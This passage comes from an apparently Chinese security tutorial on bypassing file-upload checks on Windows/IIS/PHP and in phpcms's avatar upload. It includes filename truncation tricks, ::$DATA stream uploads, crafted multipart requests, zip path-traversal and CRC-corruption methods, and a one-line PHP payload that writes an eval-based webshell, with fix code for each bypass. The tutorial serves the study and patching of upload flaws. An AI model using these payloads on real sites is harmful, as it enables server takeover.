class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">  &lt;form method=<span class=\"string\">&quot;post&quot;</span> action=<span class=\"string\">&quot;upfile.php&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> value=<span class=\"string\">&quot;&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;hidden&quot;</span> name=<span class=\"string\">&quot;filename&quot;</span> value=<span class=\"string\">&quot;file&quot;</span>/&gt;</span><br><span class=\"line\">   &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;upload&quot;</span>/&gt;</span><br><span class=\"line\">  &lt;/form&gt;</span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>前置知识 1.</p>\n<p>php 可以使用 <code>%00</code>  截断，也可以使用 <code>:</code>  截断，但：截断后文件内容是空的</p>\n<p>(我看人家说用 #? 这两个字符也能截断… 我觉得不太对)</p>\n<p>前置知识 2.</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Windows</span>+<span class=\"variable constant_\">IIS</span>+<span class=\"variable constant_\">PHP</span>下</span><br><span class=\"line\">双引号(<span class=\"string\">&quot;“&quot;</span>) &lt;==&gt; 点号(<span class=\"string\">&quot;.&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">大于符号(&quot;&gt;&quot;) &lt;==&gt; 问号(&quot;?&quot;)&#x27;</span>;</span><br><span class=\"line\">小于符号(<span class=\"string\">&quot;&lt;&quot;</span>) &lt;==&gt; 星号(<span class=\"string\">&quot;*&quot;</span>)<span class=\"string\">&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">上述是等价的，但*又可以做通配符使用，因此我们可以使用&lt;作为通配符</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"利用覆盖生成文件\"><a class=\"markdownIt-Anchor\" href=\"#利用覆盖生成文件\">#</a> 利用：覆盖生成文件</h3>\n<p>先安装 IIS 和对应的管理工具</p>\n<p>1) 首先利用冒号生成我们将要覆盖的 php 文件，这里为：bypass.php，抓包将其改为 bypass.php:jpg</p>\n<p>此时会覆盖文件，文件上传后的文件名为 bypass.php，大小为 0kb</p>\n<p>2) 利用上面的系统特性覆盖该文件</p>\n<p>从上面已经知道 &quot;&lt;&quot; 就等于 “ <code>*</code> ”, 而 &quot; <code>*</code> &quot; 代码任意字符，于是乎… 我们可以这样修改上传的文件名</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&quot;bypass.&lt;&lt;&lt;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>此时即可覆盖 bypass.php，同时文件内容被成功写了进去，后面就可以在内容中写 php 代码</p>\n<h3 id=\"通过默认数据流上传php文件\"><a class=\"markdownIt-Anchor\" href=\"#通过默认数据流上传php文件\">#</a> 通过默认数据流上传 php 文件</h3>\n<p>抓包，修改文件名，在结尾添加::$DATA</p>\n<p>The default data stream has no name. That is, the fully qualified name for the default stream for a file called “sample.txt” is “sample.txt::<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>i</mi><mi>n</mi><mi>c</mi><mi>e</mi><mi mathvariant=\"normal\">&quot;</mi><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mi mathvariant=\"normal\">&quot;</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant=\"normal\">&quot;</mi></mrow><annotation encoding=\"application/x-tex\">DATA&quot; since &quot;sample.txt&quot; is the name of the file and &quot;</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">&quot;</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">&quot;</span></span></span></span>DATA” is the stream type</p>\n<p>默认数据流没有名称。也就是说，名为 “sample.txt” 的文件的默认流的完全限定名是 “sample.txt:：<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>”，因为“</mtext><mi>s</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant=\"normal\">.</mi><mi>t</mi><mi>x</mi><mi>t</mi><mtext>”是文件名，“</mtext></mrow><annotation encoding=\"application/x-tex\">DATA”，因为“sample.txt”是文件名，“</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mathnormal\">A</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\">A</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">因</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord\">“</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">t</span><span class=\"mord\">”</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\">“</span></span></span></span>DATA” 是流类型</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------<span class=\"title class_\">WebKitFormBoundaryaaRARrn2LBvpvcwK</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Disposition</span>: form-data; name=<span class=\"string\">&quot;file&quot;</span>; filename=<span class=\"string\">&#x27;DataStreamTest.php::$DATA&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br></pre></td></tr></table></figure>\n<p>成功上传后缀为 php 的文件</p>\n<h2 id=\"phpcms文件上传四次绕过\"><a class=\"markdownIt-Anchor\" href=\"#phpcms文件上传四次绕过\">#</a> phpcms 文件上传四次绕过</h2>\n<p>1. 只能上传压缩文件，上传后解压，判断文件后缀，删除非法文件</p>\n<p>没有递归删除文件，导致可以构造文件夹，文件夹中放非法文件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function check_dir($<span class=\"built_in\">dir</span>)&#123;</span><br><span class=\"line\">    $handle = opendir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(($f = readdir($handle)) !== false)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array($f, array(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            $ext = strtolower(substr(strrchr($f, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!in_array($ext, array(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                unlink($<span class=\"built_in\">dir</span>.$f);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>修复：递归删除</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//递归删除</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_dir</span>(<span class=\"params\"><span class=\"variable\">$dir</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$handle</span> = <span class=\"title function_ invoke__\">opendir</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((<span class=\"variable\">$f</span> = <span class=\"title function_ invoke__\">readdir</span>(<span class=\"variable\">$handle</span>)) !== <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$f</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;..&#x27;</span>)))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>))&#123;</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">check_dir</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>.<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">             &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$f</span>, <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>));</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$ext</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">                    <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$dir</span>.<span class=\"variable\">$f</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>2. 先解压再删除，条件竞争，通过上传后没有删除的短暂时间内访问该文件，在该文将上一级目录写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(in_array($ext, array(<span class=\"string\">&#x27;zip&#x27;</span>, <span class=\"string\">&#x27;jpg&#x27;</span>, <span class=\"string\">&#x27;gif&#x27;</span>, <span class=\"string\">&#x27;png&#x27;</span>)))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($ext == <span class=\"string\">&#x27;zip&#x27;</span>)&#123;</span><br><span class=\"line\">        $archive = new PclZip($file[<span class=\"string\">&#x27;tmp_name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">               exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">        exit(<span class=\"string\">&#x27;上传成功!&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<p>通过 BP 一边一直上传，一边一直访问上传文件，上传的文件使用 fputs 在上级写马</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(<span class=\"string\">&#x27;../../../../../shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php phpinfo();eval($_POST[a]);?&gt;&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>\n<p>修复：通过上传文件夹名为随机文件名来禁止访问</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($<span class=\"built_in\">dir</span>))&#123;</span><br><span class=\"line\">    mkdir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.md5(time(). rand(<span class=\"number\">1000</span>,<span class=\"number\">9999</span>));</span><br><span class=\"line\">$temp_dir = $<span class=\"built_in\">dir</span>.<span class=\"string\">&#x27;member/1/&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!is_dir($temp_dir))&#123;</span><br></pre></td></tr></table></figure>\n<p>3. 通过解压失败直接退出绕过。构造可以解压一半的压缩包，把木马解压后再失败退出。目录通过右键查看图片链接获得</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修复：退出之前递归删除</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">       check_dir($<span class=\"built_in\">dir</span>);</span><br><span class=\"line\">       exit(<span class=\"string\">&quot;解压失败&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这边详细讲一下怎么构造只能解压一部分的压缩包</p>\n<ol>\n<li>使用 Windows 下的 7zip</li>\n</ol>\n<p>修改压缩包里文件的 CRC 校验码</p>\n<p>先准备两个文件，一个 PHP 文件 1.php，一个文本文件 2.txt，其中 1.php 是 webshell。然后将这两个文件压缩成 shell.zip。 然后我们用 010editor 打开 shell.zip，可以看到右下角有这个文件的格式信息，它被分成 5 部分，如图 1。我们打开第 4 部分，其中有个 deCrc，我们随便把值改成其他的值，然后保存。</p>\n<ol start=\"2\">\n<li>使用 PHP 自带的 ZipArchive 库</li>\n</ol>\n<p>Windows 下不允许文件名中包含冒号（:），我们就可以在 010editor 中将 2.txt 的 deFileName 属性的值改成 “2.tx:”</p>\n<p>在 Linux 下也有类似的方法，我们可以将文件名改成 5 个斜杠（/////）</p>\n<p>4. 把压缩包中某文件名改成…/…/…/…/…/index.php，解压后文件直接到网站根目录</p>\n<p>注意修改文件名后文件名长度不变</p>\n<p>5. 通过验证文件名中不包含 <code>../</code>  并且文件名需要为 jpg</p>\n<p>通过构造 1.php;1.jpg</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foreach ($content <span class=\"keyword\">as</span> $t) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE ||</span><br><span class=\"line\">                strpos($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== FALSE) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (substr(strrchr($t[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\"><span class=\"meta\">                @unlink(<span class=\"params\">$filename</span>);</span></span><br><span class=\"line\">                exit(function_exists(<span class=\"string\">&#x27;iconv&#x27;</span>) ? iconv(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>6. 正确的防御方法：<br>\n把压缩包放进 tmp 目录里，如果上传、解压缩的操作都能在 tmp 目录里完成，再把我们需要的头像文件拷贝到 web 目录中</p>\n<p>7. 附上最后一版的防御代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">upload</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 大众版头像上传处理 2014-6-15</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;环境不支持&#x27;</span>) : <span class=\"string\">&#x27;The php does not support&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 创建图片存储文件夹</span></span><br><span class=\"line\">        <span class=\"variable\">$dir</span> = FCPATH.<span class=\"string\">&#x27;member/uploadfile/member/&#x27;</span>.<span class=\"variable language_\">$this</span>-&gt;uid.<span class=\"string\">&#x27;/&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$dir</span>)) &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$dir</span>, <span class=\"number\">0777</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$filename</span> = <span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;avatar.zip&#x27;</span>; <span class=\"comment\">// 存储flashpost图片</span></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"variable\">$filename</span>, <span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&#x27;HTTP_RAW_POST_DATA&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"comment\">// 解压缩文件</span></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;load-&gt;<span class=\"title function_ invoke__\">library</span>(<span class=\"string\">&#x27;Pclzip&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">PclFile</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$content</span> = <span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">listContent</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"variable\">$content</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件已损坏&#x27;</span>) : <span class=\"string\">&#x27;The file has damaged&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 验证文件</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$content</span> <span class=\"keyword\">as</span> <span class=\"variable\">$t</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;..&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span> ||</span><br><span class=\"line\">                <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;/&#x27;</span>) !== <span class=\"literal\">FALSE</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;非法名称的文件&#x27;</span>) : <span class=\"string\">&#x27;llegal name file&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">substr</span>(<span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$t</span>[<span class=\"string\">&#x27;stored_filename&#x27;</span>], <span class=\"string\">&#x27;.&#x27;</span>), <span class=\"number\">1</span>) != <span class=\"string\">&#x27;jpg&#x27;</span>) &#123;</span><br><span class=\"line\">                @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">                <span 